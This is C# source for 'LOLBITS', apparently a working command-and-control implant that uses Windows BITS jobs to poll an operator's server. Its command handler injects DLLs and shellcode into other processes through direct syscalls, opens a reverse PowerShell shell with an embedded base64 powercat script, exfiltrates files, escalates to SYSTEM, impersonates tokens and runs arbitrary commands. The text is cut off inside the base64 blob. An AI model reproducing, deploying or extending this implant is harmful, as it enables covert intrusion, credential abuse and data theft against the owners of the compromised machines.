﻿using System;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
using System.Reflection;
using Newtonsoft.Json;
using BITS4 = BITSReference4_0;
using System.Management.Automation.Runspaces;
using System.Management;
using System.Diagnostics;
using System.Collections.Generic;

namespace LOLBITS
{

    public class Controller
    {

       

        private const string Contid = "7061796c676164";
        private string P;
        private string Id;
        private string Auth;
        private string[] RestoreKeys;
        private string Url;
        private string TempPath;
        private TokenManager TokenManager;
        private Jobs JobsManager;
        private static SyscallManager syscall;

        public Controller(string Id, string url,string password)
        {
            this.Id = Id;
            Url = url;
            P = password;
            JobsManager = new Jobs(Url);
            TokenManager = new TokenManager();
            syscall = new SyscallManager();
            if (Environment.GetEnvironmentVariable("temp") != null)
            {
                TempPath = Environment.GetEnvironmentVariable("temp");
            }
            else
            {
                TempPath = @"C:\Windows\Temp\";
            }
        }

        public string GetPassword()
        {
            return P;
        }

        public void Start()
        { 

            string startBits = "sc start BITS";
            TokenUtils.ExecuteCommand(startBits);
            Thread.Sleep(500);
            string filePath = TempPath + @"\" + Id;

            if (TryInitialCon(filePath))
            {
                Content file = GetEncryptedFileContent(filePath, out var unused);
                Id = file.NextId;
                Auth = file.NextAuth;
                RestoreKeys = file.Commands; 
                string domain = Environment.GetEnvironmentVariable("userdomain");
                string user = Environment.GetEnvironmentVariable("username");
                Response response = new Response(domain + @"\" + user, Auth);
                filePath = TempPath + @"\" + Id + ".txt";
                EncryptResponseIntoFile(filePath, response);

                JobsManager.Send(Id, filePath);

                Loop();
                

                /*Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    bitmap.Save(@"c:\users\pccom\desktop\test.jpg", ImageFormat.Jpeg);
                }*/
            }



        }

        private void Loop()
        {
            bool exit = false;
            string filePath, headers;

            while (!exit)
            {
                filePath = TempPath + @"\" + Id;

                headers = "reqid: " + Auth;
                Console.WriteLine("next: " + Id);
                if (JobsManager.Get(Id, filePath, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                {
                    Content file = GetEncryptedFileContent(filePath, out var unused);

                    Id = file.NextId;
                    Auth = file.NextAuth;
                    Console.WriteLine("Id: " + Id);
                    Console.WriteLine("Auth: " + Auth);

                    if (file.Commands.Length > 0)
                        DoSomething(file);
                    


                    Thread.Sleep(1000);
                }
                else
                {

                    if (RestoreKeys.Length > 0)
                    {
                        Auth = RestoreKeys[RestoreKeys.Length - 1];
                        Array.Resize(ref RestoreKeys,RestoreKeys.Length - 1);
                    }
                    else { exit = true; }
                }
            }

        }

        private void DoSomething(Content file)
        {

            string rps = "";

            switch (file.Commands[0])
            {
                case "inject_dll":
                    {
                        string fileP = TempPath + @"\" + Id;
                        string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;

                        if (JobsManager.Get(Id, fileP, headers,BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                        {
                            try
                            {
                                Assembly dll = LoadDll(fileP);
                                string method = file.Commands[1];
                                string args = "";
                                for (int i = 2; i < file.Commands.Length; i++)
                                {
                                    args += file.Commands[i];
                                    if (i < file.Commands.Length)
                                        args += " ";
                                }
                                string[] arguments = new string[] { args };

                                LauncherDll.Main(method, arguments, dll);
                                rps = "Dll injected!";
                            }
                            catch (Exception)
                            {
                                rps = "ERR:Fatal error ocurred while trying to inject the dll.\n";
                            }
                        }
                        else
                        {
                            rps = "ERR:Dll not found!\n";
                        }


                        break;
                    }

                case "inject_shellcode":
                    {
                        string fileP = TempPath + @"\" + Id;
                        string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;
                        int pid = -1;
                        if (file.Commands.Length >= 2)
                            pid = int.Parse(file.Commands[1]);


                        if (JobsManager.Get(Id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                        {
                            byte[] sh;
                            GetEncryptedFileContent(fileP, out sh);

                            try
                            {

                                LauncherShellcode.Main(sh, syscall, pid);
                                rps = "Shellcode injected!\n";
                            }
                            catch (Exception)
                            {
                                rps = "ERR:Fatal error ocurred while trying to inject shellcode.\n";
                            }
                        }
                        else
                        {
                            rps = "ERR:Shellcode file not found!\n";
                        }

                        break;
                    }

                case "powershell":
                    {
                        rps = TokenUtils.ExecuteCommand("powershell -V 2 /C Write-Host hi");

                        if (rps.Replace("\n","").Replace(" ","") == "hi")
                        {
                            LauncherPowershell.Main(file.Commands[1], file.Commands[2]);
                            rps = "You should have your Powershell at " + file.Commands[1] + ":" + file.Commands[2] + "!\n";

                        }
                        else
                        {
                            rps = "Version 2 of Powershell not available. Try injecting EvilSalsa by CyberVaca in order to use powershell without am" + "si.\n";
                        }

                        break;
                    }

                case "send":
                    {
                        string fileP = TempPath + @"\" + Id;
                        string headers = "reqid: " + Auth + "\r\ncontid: " + Contid;

                        if (JobsManager.Get(Id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                        {
                            File.Copy(fileP, file.Commands[1], true);
                            rps = "Dowload finished.\n";
                        }
                        else
                        {
                            rps = "ERR:Download failed!\n";
                        }

                        break;
                    }
                case "exfiltrate":
                    {
                        if (File.Exists(file.Commands[1]))
                        {
                            if (JobsManager.Send(file.Commands[2], file.Commands[1]))
                            {
                                rps = "Exfiltration succeed.\n";

                            } else
                                rps = "ERR:Exfiltration failed!\n";
                        }
                        else
                            rps = "ERR:File to exfiltrate not found!\n";

                        break;
                    }
                case "getsystem":
                    {

                        if (TokenUtils.IsHighIntegrity())
                            rps = TokenManager.getSystem() ? "We are System!\n" : "ERR:Process failed! Is this process running with high integrity level?\n";
                        else
                            rps = "ERR:Process failed! Is this process running with high integrity level?\n";

                        break;
                    }

                case "rev2self":
                    {
                        TokenManager.Rev2Self();
                        rps = "Welcome back.\n";
                      
                        break;
                    }


                case "runas":
                    {
                        string user = "", domain = "", password = "";
                        string[] userData = file.Commands[1].Split('\\');
                        if (userData.Length == 1)
                        {
                            domain = ".";
                            user = userData[0];
                        }
                        else
                        {
                            domain = userData[0];
                            user = userData[1];
                        }

                        password = file.Commands[2];

                        rps = TokenManager.Runas(domain, user, password) ? "Success!" : "ERR:Invalid credentials.";


                        break;
                    }

                case "list": 
                    {
                        rps = GetProcessInfo();
                        break;
                    }

                case "impersonate":
                    {
                        try
                        {
                            if (TokenManager.Impersonate(int.Parse(file.Commands[1])))
                                rps = "Impersonation achieved!\n";
                            else
                                rps = "ERR: Not enough privileges!\n";
                        }
                        catch
                        {
                            rps = "ERR: Impersonation failed!\n";
                        }

                        break;

                    }

                case "exit":
                    {
                        Environment.Exit(0);
                        break;
                    }

                default:
                    {
                        rps = TokenUtils.ExecuteCommand(file.Commands[0]);
                        break;
                    }

                   
            }

            Response response = new Response(rps, Auth);
            string filePath = TempPath + @"\" + Id + ".txt";
            EncryptResponseIntoFile(filePath, response);
            TrySend(filePath);

        }

        private string GetProcessInfo()
        {
            string output = "\n";
            output = string.Concat(output, string.Format("{0,30}|{1,10}|{2,20}|\n", "NAME", "PID", "ACCOUNT"));
            foreach (var process in Process.GetProcesses())
            {
                string name = process.ProcessName;
                int processId = process.Id;

                output = string.Concat(output, string.Format("{0,30}|{1,10}|{2,20}|\n", name, processId, GetProcessOwner(processId)));
            }
            return output;
        }

        private string GetProcessOwner (int processId)
        {

            string query = "Select * From Win32_Process Where ProcessID = " + processId;
            ManagementObjectSearcher moSearcher = new ManagementObjectSearcher(query);
            ManagementObjectCollection moCollection = moSearcher.Get();

            foreach (ManagementObject mo in moCollection)
            {
                string[] args = new string[] { string.Empty };
                int returnVal = Convert.ToInt32(mo.InvokeMethod("GetOwner", args));
                if (returnVal == 0)
                    return args[0];
            }

            return "UNKNOWN";
        }
        private bool TrySend(string filePath)
        {
            int cont = 0;
            while (cont < 5)
            {
                if (JobsManager.Send(Id, filePath))
                {
                    return true;
                }
                ++cont;
            }
            return false;
        }

        private bool TryInitialCon(string filePath)
        {
            int cont = 0;
            while (cont < 5)
            {
                if(JobsManager.Get(Id, filePath, null,BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                {
                    return true;
                }
                ++cont;
            }

            return false;
        }

        private void EncryptResponseIntoFile(string filePath, Response response)
        {
            string json_response = JsonConvert.SerializeObject(response);
            byte[] content_decrypted = Encoding.UTF8.GetBytes(json_response);
            byte[] xKey = Encoding.ASCII.GetBytes(P);
            byte[] content_encrypted = RC4.Encrypt(xKey, content_decrypted);
            string hexadecimal = BiteArrayToHex.Convierte(content_encrypted);
            string fileContent = Zipea.Comprime(hexadecimal);
            File.WriteAllText(filePath, fileContent);
        }

        private Content GetEncryptedFileContent(string filePath, out byte[] decrypted)
        {

            string fileStr = File.ReadAllText(filePath);
            byte[] xKey = Encoding.ASCII.GetBytes(P);
            string hexadecimal = Zipea.Descomprime(fileStr);
            byte[] content_encrypted = StringHEXToByteArray.Convierte(hexadecimal); 
            byte[] content_decrypted = RC4.Decrypt(xKey, content_encrypted);
            decrypted = content_decrypted;
            string content_encoded = Encoding.UTF8.GetString(content_decrypted);

            try
            {
                Content final = JsonConvert.DeserializeObject<Content>(content_encoded);
                return final;

            } catch
            {
                return null;
            }
        }

        private Assembly LoadDll(string filePath)
        {
            string fileStr = File.ReadAllText(filePath);
            byte[] xKey = Encoding.ASCII.GetBytes(P);
            string hexadecimal = Zipea.Descomprime(fileStr);
            byte[] content_encrypted = StringHEXToByteArray.Convierte(hexadecimal);
            byte[] content_decrypted = RC4.Decrypt(xKey, content_encrypted);
            Assembly dll = Assembly.Load(content_decrypted);

            return dll;
        }
 

    }

    public class LauncherDll
    {

        public static void Main(string method, string[] arguments, Assembly dll)
        {

            LauncherDll obj = new LauncherDll();

            Thread thr1 = new Thread(obj.ExecuteDllInMemory);

            object[] a = new object []{ method, arguments, dll };

            thr1.Start(a);
        }

        public void ExecuteDllInMemory(object args)
        {

            object[] a = (object[])args;
            string method = (string)a[0];
            string[] arguments = (string[])a[1];
            Assembly dll = (Assembly)a[2];
            Type myType = dll.GetTypes()[0];
            MethodInfo Method = myType.GetMethod(method);
            object myInstance = Activator.CreateInstance(myType);
            Method.Invoke(myInstance, new object[] { arguments });

        }
    }

    public class LauncherPowershell
    {

        public static void Main(string ip, string puerto)
        {
            LauncherPowershell obj = new LauncherPowershell();

            Thread thr1 = new Thread(obj.ExecutePowershell);


            object[] a = new object[] {ip, puerto };
            thr1.Start(a);
        }

        public void ExecutePowershell(object args)
        {
            object[] a = (object[])args;
            string ip = (string)a[0];
            string puerto = (string)a[1];
            PowerShellProcessInstance instance = new PowerShellProcessInstance(new Version(2, 0), null, null, false);
            using (Runspace rs = RunspaceFactory.CreateOutOfProcessRunspace(new TypeTable(new string[0]), instance))
            {
                rs.Open();

                Pipeline pipeline = rs.CreatePipeline();
                pipeline.Commands.AddScript(Powercat.powercatbase64());
                pipeline.Commands.AddScript("powercat -c " + ip + "  " + puerto + " -ep");
                pipeline.Invoke();
            }

        }
    }

    public class LauncherShellcode
    {
        [Flags]
        public enum AllocationType : uint
        {
            COMMIT = 0x1000,
            RESERVE = 0x2000,
            RESET = 0x80000,
            LARGE_PAGES = 0x20000000,
            PHYSICAL = 0x400000,
            TOP_DOWN = 0x100000,
            WRITE_WATCH = 0x200000
        }

        [Flags]
        public enum MemoryProtection : uint
        {
            EXECUTE = 0x10,
            EXECUTE_READ = 0x20,
            EXECUTE_READWRITE = 0x40,
            EXECUTE_WRITECOPY = 0x80,
            NOACCESS = 0x01,
            READONLY = 0x02,
            READWRITE = 0x04,
            WRITECOPY = 0x08,
            GUARD_Modifierflag = 0x100,
            NOCACHE_Modifierflag = 0x200,
            WRITECOMBINE_Modifierflag = 0x400
        }

        public enum FreeType : uint
        {
            MEM_DECOMMIT = 0x4000,
            MEM_RELEASE = 0x8000
        }

        public unsafe struct MyBuffer32
        {
            public fixed char fixedBuffer[32];
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct UNKNOWN32
        {
            public uint Size;
            public uint Unknown1;
            public uint Unknown2;
            public MyBuffer32* Unknown3;
            public uint Unknown4;
            public uint Unknown5;
            public uint Unknown6;
            public MyBuffer32* Unknown7;
            public uint Unknown8;
        }

        public unsafe struct MyBuffer64
        {
            public fixed char fixedBuffer[64];
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct UNKNOWN64
        {
            public long Size;
            public long Unknown1;
            public long Unknown2;
            public MyBuffer64* UnknownPtr;
            public long Unknown3;
            public long Unknown4;
            public long Unknown5;
            public MyBuffer64* UnknownPtr2;
            public long Unknown6;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, AllocationType lAllocationType, MemoryProtection flProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, out IntPtr BaseAddress, uint ZeroBits, out UIntPtr RegionSize, AllocationType AllocationType, MemoryProtection Protect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal delegate int NtWriteVirtualMemory(IntPtr processHandle, IntPtr address, byte[] buffer, UIntPtr size, IntPtr bytesWrittenBuffer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal delegate int NtCreateThreadEx32(out IntPtr hThread, Int32 DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended,
            uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, out UNKNOWN32 lpBytesBuffer);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)] //NtCreateThreadEx expect different kind of parameters for 32 and 64 bits processes injection. 
        internal delegate int NtCreateThreadEx64(out IntPtr hThread, long DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended,
            ulong StackZeroBits, ulong SizeOfStackCommit, ulong SizeOfStackReserve, out UNKNOWN64 lpBytesBuffer);


        public static void Main(byte[] shellcode, SyscallManager syscall, int pid)
        {
            LauncherShellcode obj = new LauncherShellcode();

            Thread thr1 = new Thread(obj.ExecuteShellcodeInMemory);

            object[] a = new object[] { shellcode, syscall, pid};

            thr1.Start(a);
        }

        public unsafe void ExecuteShellcodeInMemory(object args) //activar sedebug 
        {

            object[] argumentos = (object[])args;
            byte[] sc = (byte[]) argumentos[0];
            SyscallManager syscall = (SyscallManager)argumentos[1];
            int pid = (int)argumentos[2];
            IntPtr handle = Process.GetCurrentProcess().Handle;

            if(pid != -1)
            {
                IntPtr token = IntPtr.Zero;
                TokenUtils.getProcessToken(Process.GetCurrentProcess().Handle, TokenUtils.TokenAccessFlags.TOKEN_ADJUST_PRIVILEGES, out token);
                List<string> l = new List<string>();
                l.Add("SeDebugPrivilege");
                TokenUtils.enablePrivileges(token, l);

                TokenUtils.getProcessHandle(pid, out handle, TokenUtils.ProcessAccessFlags.All);
            }


            try
            {

                IntPtr baseAddr = IntPtr.Zero;
                byte[] shellcode = syscall.getSyscallASM("NtAllocateVirtualMemory");
                var shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
                var syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtAllocateVirtualMemory));

                var arguments = new object[] { handle, baseAddr, (uint)0, (UIntPtr)(sc.Length + 1), AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE };
                var returnValue = syscallDelegate.DynamicInvoke(arguments);

                if ((int)returnValue == 0)
                {
                    baseAddr = (IntPtr)arguments[1]; //required!

                    shellcode = syscall.getSyscallASM("NtWriteVirtualMemory");
                    shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                    Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
                    syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtWriteVirtualMemory));

                    arguments = new object[] { handle, baseAddr, sc, (UIntPtr)(sc.Length + 1), IntPtr.Zero };

                    returnValue = syscallDelegate.DynamicInvoke(arguments);
                    baseAddr = (IntPtr)arguments[1];

                    if ((int)returnValue == 0)
                    {

                        MyBuffer64 a = new MyBuffer64();
                        MyBuffer64 b = new MyBuffer64();

                        UNKNOWN64 u = new UNKNOWN64();
                        u.Size = (uint)Marshal.SizeOf(u);
                        u.Unknown1 = 65539;
                        u.Unknown2 = 16;
                        u.UnknownPtr = &a;
                        u.Unknown4 = 65540;
                        u.Unknown5 = 8;
                        u.Unknown6 = 0;
                        u.UnknownPtr2 = &b;
                        u.Unknown3 = 0;



                        shellcode = syscall.getSyscallASM("NtCreateThreadEx");
                        shellcodeBuffer = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, AllocationType.RESERVE | AllocationType.COMMIT, MemoryProtection.EXECUTE_READWRITE);
                        Marshal.Copy(shellcode, 0, shellcodeBuffer, shellcode.Length);
                        syscallDelegate = Marshal.GetDelegateForFunctionPointer(shellcodeBuffer, typeof(NtCreateThreadEx64));

                        arguments = new object[] { IntPtr.Zero, 0x001FFFFF, IntPtr.Zero, handle, baseAddr, IntPtr.Zero, false, (ulong)0, (ulong)0, (ulong)0, u };
                        returnValue = syscallDelegate.DynamicInvoke(arguments);

                    }
                }
                
            }
            catch {}
         
        }

    }

    public class Powercat
    {
        public static string powercatbase64()
        {
            return Encoding.UTF8.GetString(Convert.FromBase64String("ZnVuY3Rpb24gcG93ZXJjYXQgewogICAgcGFyYW0oCiAgICAgICAgW2FsaWFzKCJDbGllbnQiKV1bc3RyaW5nXSRjID0gIiIsCiAgICAgICAgW2FsaWFzKCJMaXN0ZW4iKV1bc3dpdGNoXSRsID0gJEZhbHNlLAogICAgICAgIFthbGlhcygiUG9ydCIpXVtQYXJhbWV0ZXIoUG9zaXRpb24gPSAtMSldW3N0cmluZ10kcCA9ICIiLAogICAgICAgIFthbGlhcygiRXhlY3V0ZSIpXVtzdHJpbmddJGUgPSAiIiwKICAgICAgICBbYWxpYXMoIkV4ZWN1dGVQb3dlcnNoZWxsIildW3N3aXRjaF0kZXAgPSAkRmFsc2UsCiAgICAgICAgW2FsaWFzKCJSZWxheSIpXVtzdHJpbmddJHIgPSAiIiwKICAgICAgICBbYWxpYXMoIlVEUCIpXVtzd2l0Y2hdJHUgPSAkRmFsc2UsCiAgICAgICAgW2FsaWFzKCJkbnNjYXQyIildW3N0cmluZ10kZG5zID0gIiIsCiAgICAgICAgW2FsaWFzKCJETlNGYWlsdXJlVGhyZXNob2xkIildW2ludDMyXSRkbnNmdCA9IDEwLAogICAgICAgIFthbGlhcygiVGltZW91dCIpXVtpbnQzMl0kdCA9IDYwLAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSldW2FsaWFzKCJJbnB1dCIpXSRpID0gJG51bGwsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdIb3N0JywgJ0J5dGVzJywgJ1N0cmluZycpXVthbGlhcygiT3V0cHV0VHlwZSIpXVtzdHJpbmddJG8gPSAiSG9zdCIsCiAgICAgICAgW2FsaWFzKCJPdXRwdXRGaWxlIildW3N0cmluZ10kb2YgPSAiIiwKICAgICAgICBbYWxpYXMoIkRpc2Nvbm5lY3QiKV1bc3dpdGNoXSRkID0gJEZhbHNlLAogICAgICAgIFthbGlhcygiUmVwZWF0ZXIiKV1bc3dpdGNoXSRyZXAgPSAkRmFsc2UsCiAgICAgICAgW2FsaWFzKCJHZW5lcmF0ZVBheWxvYWQiKV1bc3dpdGNoXSRnID0gJEZhbHNlLAogICAgICAgIFthbGlhcygiR2VuZXJhdGVFbmNvZGVkIildW3N3aXRjaF0kZ2UgPSAkRmFsc2UsCiAgICAgICAgW2FsaWFzKCJIZWxwIildW3N3aXRjaF0kaCA9ICRGYWxzZSwKICAgICAgICBbc3dpdGNoXSRzc2wgPSAkRmFsc2UKICAgICkKICAKICAgICMjIyMjIyMjIyMjIyMjIyBIRUxQICMjIyMjIyMjIyMjIyMjIwogICAgJEhlbHAgPSAiCnBvd2VyY2F0IC0gTmV0Y2F0LCBUaGUgUG93ZXJzaGVsbCBWZXJzaW9uCkdpdGh1YiBSZXBvc2l0b3J5OiBodHRwczovL2dpdGh1Yi5jb20vYmVzaW1vcmhpbm8vcG93ZXJjYXQKClRoaXMgc2NyaXB0IGF0dGVtcHRzIHRvIGltcGxlbWVudCB0aGUgZmVhdHVyZXMgb2YgbmV0Y2F0IGluIGEgcG93ZXJzaGVsbApzY3JpcHQuIEl0IGFsc28gY29udGFpbnMgZXh0cmEgZmVhdHVyZXMgc3VjaCBhcyBidWlsdC1pbiByZWxheXMsIGV4ZWN1dGUKcG93ZXJzaGVsbCwgYW5kIGEgZG5zY2F0MiBjbGllbnQuCgpVc2FnZTogcG93ZXJjYXQgWy1jIG9yIC1sXSBbLXAgcG9ydF0gW29wdGlvbnNdCgogIC1jICA8aXA+ICAgICAgICBDbGllbnQgTW9kZS4gUHJvdmlkZSB0aGUgSVAgb2YgdGhlIHN5c3RlbSB5b3Ugd2lzaCB0byBjb25uZWN0IHRvLgogICAgICAgICAgICAgICAgICBJZiB5b3UgYXJlIHVzaW5nIC1kbnMsIHNwZWNpZnkgdGhlIEROUyBTZXJ2ZXIgdG8gc2VuZCBxdWVyaWVzIHRvLgogICAgICAgICAgICAKICAtbCAgICAgICAgICAgICAgTGlzdGVuIE1vZGUuIFN0YXJ0IGEgbGlzdGVuZXIgb24gdGhlIHBvcnQgc3BlY2lmaWVkIGJ5IC1wLgogIAogIC1wICA8cG9ydD4gICAgICBQb3J0LiBUaGUgcG9ydCB0byBjb25uZWN0IHRvLCBvciB0aGUgcG9ydCB0byBsaXN0ZW4gb24uCiAgCiAgLWUgIDxwcm9jPiAgICAgIEV4ZWN1dGUuIFNwZWNpZnkgdGhlIG5hbWUgb2YgdGhlIHByb2Nlc3MgdG8gc3RhcnQuCiAgCiAgLWVwICAgICAgICAgICAgIEV4ZWN1dGUgUG93ZXJzaGVsbC4gU3RhcnQgYSBwc2V1ZG8gcG93ZXJzaGVsbCBzZXNzaW9uLiBZb3UgY2FuCiAgICAgICAgICAgICAgICAgIGRlY2xhcmUgdmFyaWFibGVzIGFuZCBleGVjdXRlIGNvbW1hbmRzLCBidXQgaWYgeW91IHRyeSB0byBlbnRlcgogICAgICAgICAgICAgICAgICBhbm90aGVyIHNoZWxsIChuc2xvb2t1cCwgbmV0c2gsIGNtZCwgZXRjLikgdGhlIHNoZWxsIHdpbGwgaGFuZy4KICAgICAgICAgICAgCiAgLXIgIDxzdHI+ICAgICAgIFJlbGF5LiBVc2VkIGZvciByZWxheWluZyBuZXR3b3JrIHRyYWZmaWMgYmV0d2VlbiB0d28gbm9kZXMuCiAgICAgICAgICAgICAgICAgIENsaWVudCBSZWxheSBGb3JtYXQ6ICAgLXIgPHByb3RvY29sPjo8aXAgYWRkcj46PHBvcnQ+CiAgICAgICAgICAgICAgICAgIExpc3RlbmVyIFJlbGF5IEZvcm1hdDogLXIgPHByb3RvY29sPjo8cG9ydD4KICAgICAgICAgICAgICAgICAgRE5TQ2F0MiBSZWxheSBGb3JtYXQ6ICAtciBkbnM6PGRucyBzZXJ2ZXI+OjxkbnMgcG9ydD46PGRvbWFpbj4KICAgICAgICAgICAgCiAgLXUgICAgICAgICAgICAgIFVEUCBNb2RlLiBTZW5kIHRyYWZmaWMgb3ZlciBVRFAuIEJlY2F1c2UgaXQncyBVRFAsIHRoZSBjbGllbnQKICAgICAgICAgICAgICAgICAgbXVzdCBzZW5kIGRhdGEgYmVmb3JlIHRoZSBzZXJ2ZXIgY2FuIHJlc3BvbmQuCiAgICAgICAgICAgIAogIC1kbnMgIDxkb21haW4+ICBETlMgTW9kZS4gU2VuZCB0cmFmZmljIG92ZXIgdGhlIGRuc2NhdDIgZG5zIGNvdmVydCBjaGFubmVsLgogICAgICAgICAgICAgICAgICBTcGVjaWZ5IHRoZSBkbnMgc2VydmVyIHRvIC1jLCB0aGUgZG5zIHBvcnQgdG8gLXAsIGFuZCBzcGVjaWZ5IHRoZSAKICAgICAgICAgICAgICAgICAgZG9tYWluIHRvIHRoaXMgb3B0aW9uLCAtZG5zLiBUaGlzIGlzIG9ubHkgYSBjbGllbnQuCiAgICAgICAgICAgICAgICAgIEdldCB0aGUgc2VydmVyIGhlcmU6IGh0dHBzOi8vZ2l0aHViLmNvbS9pYWdveDg2L2Ruc2NhdDIKICAgICAgICAgICAgCiAgLWRuc2Z0IDxpbnQ+ICAgIEROUyBGYWlsdXJlIFRocmVzaG9sZC4gVGhpcyBpcyBob3cgbWFueSBiYWQgcGFja2V0cyB0aGUgY2xpZW50IGNhbgogICAgICAgICAgICAgICAgICByZWNpZXZlIGJlZm9yZSBleGl0aW5nLiBTZXQgdG8gemVybyB3aGVuIHJlY2VpdmluZyBmaWxlcywgYW5kIHNldCBoaWdoCiAgICAgICAgICAgICAgICAgIGZvciBtb3JlIHN0YWJpbGl0eSBvdmVyIHRoZSBpbnRlcm5ldC4KICAgICAgICAgICAgCiAgLXQgIDxpbnQ+ICAgICAgIFRpbWVvdXQuIFRoZSBudW1iZXIgb2Ygc2Vjb25kcyB0byB3YWl0IGJlZm9yZSBnaXZpbmcgdXAgb24gbGlzdGVuaW5nIG9yCiAgICAgICAgICAgICAgICAgIGNvbm5lY3RpbmcuIERlZmF1bHQ6IDYwCiAgICAgICAgICAgIAogIC1pICA8aW5wdXQ+ICAgICBJbnB1dC4gUHJvdmlkZSBkYXRhIHRvIGJlIHNlbnQgZG93biB0aGUgcGlwZSBhcyBzb29uIGFzIGEgY29ubmVjdGlvbiBpcwogICAgICAgICAgICAgICAgICBlc3RhYmxpc2hlZC4gVXNlZCBmb3IgbW92aW5nIGZpbGVzLiBZb3UgY2FuIHByb3ZpZGUgdGhlIHBhdGggdG8gYSBmaWxlLAogICAgICAgICAgICAgICAgICBhIGJ5dGUgYXJyYXkgb2JqZWN0LCBvciBhIHN0cmluZy4gWW91IGNhbiBhbHNvIHBpcGUgYW55IG9mIHRob3NlIGludG8KICAgICAgICAgICAgICAgICAgcG93ZXJjYXQsIGxpa2UgJ2FhYWFhYScgfCBwb3dlcmNhdCAtYyAxMC4xLjEuMSAtcCA4MAogICAgICAgICAgICAKICAtbyAgPHR5cGU+ICAgICAgT3V0cHV0LiBTcGVjaWZ5IGhvdyBwb3dlcmNhdCBzaG91bGQgcmV0dXJuIGluZm9ybWF0aW9uIHRvIHRoZSBjb25zb2xlLgogICAgICAgICAgICAgICAgICBWYWxpZCBvcHRpb25zIGFyZSAnQnl0ZXMnLCAnU3RyaW5nJywgb3IgJ0hvc3QnLiBEZWZhdWx0IGlzICdIb3N0Jy4KICAgICAgICAgICAgCiAgLW9mIDxwYXRoPiAgICAgIE91dHB1dCBGaWxlLiAgU3BlY2lmeSB0aGUgcGF0aCB0byBhIGZpbGUgdG8gd3JpdGUgb3V0cHV0IHRvLgogICAgICAgICAgICAKICAtZCAgICAgICAgICAgICAgRGlzY29ubmVjdC4gcG93ZXJjYXQgd2lsbCBkaXNjb25uZWN0IGFmdGVyIHRoZSBjb25uZWN0aW9uIGlzIGVzdGFibGlzaGVkCiAgICAgICAgICAgICAgICAgIGFuZCB0aGUgaW5wdXQgZnJvbSAtaSBpcyBzZW50LiBVc2VkIGZvciBzY2FubmluZy4KICAgICAgICAgICAgCiAgLXJlcCAgICAgICAgICAgIFJlcGVhdGVyLiBwb3dlcmNhdCB3aWxsIGNvbnRpbnVhbGx5IHJlc3RhcnQgYWZ0ZXIgaXQgaXMgZGlzY29ubmVjdGVkLgogICAgICAgICAgICAgICAgICBVc2VkIGZvciBzZXR0aW5nIHVwIGEgcGVyc2lzdGVudCBzZXJ2ZXIuCiAgICAgICAgICAgICAgICAgIAogIC1nICAgICAgICAgICAgICBHZW5lcmF0ZSBQYXlsb2FkLiAgUmV0dXJucyBhIHNjcmlwdCBhcyBhIHN0cmluZyB3aGljaCB3aWxsIGV4ZWN1dGUgdGhlCiAgICAgICAgICAgICAgICAgIHBvd2VyY2F0IHdpdGggdGhlIG9wdGlvbnMgeW91IGhhdmUgc3BlY2lmaWVkLiAtaSwgLWQsIGFuZCAtcmVwIHdpbGwgbm90CiAgICAgICAgICAgICAgICAgIGJlIGluY29ycG9yYXRlZC4KICAgICAgICAgICAgICAgICAgCiAgLWdlICAgICAgICAgICAgIEdlbmVyYXRlIEVuY29kZWQgUGF5bG9hZC4gRG9lcyB0aGUgc2FtZSBhcyAtZywgYnV0IHJldHVybnMgYSBzdHJpbmcgd2hpY2gKICAgICAgICAgICAgICAgICAgY2FuIGJlIGV4ZWN1dGVkIGluIHRoaXMgd2F5OiBwb3dlcnNoZWxsIC1FIDxlbmNvZGVkIHN0cmluZz4KCiAgLWggICAgICAgICAgICAgIFByaW50IHRoaXMgaGVscCBtZXNzYWdlLgoKRXhhbXBsZXM6CgogIExpc3RlbiBvbiBwb3J0IDgwMDAgYW5kIHByaW50IHRoZSBvdXRwdXQgdG8gdGhlIGNvbnNvbGUuCiAgICAgIHBvd2VyY2F0IC1sIC1wIDgwMDAKICAKICBDb25uZWN0IHRvIDEwLjEuMS4xIHBvcnQgNDQzLCBzZW5kIGEgc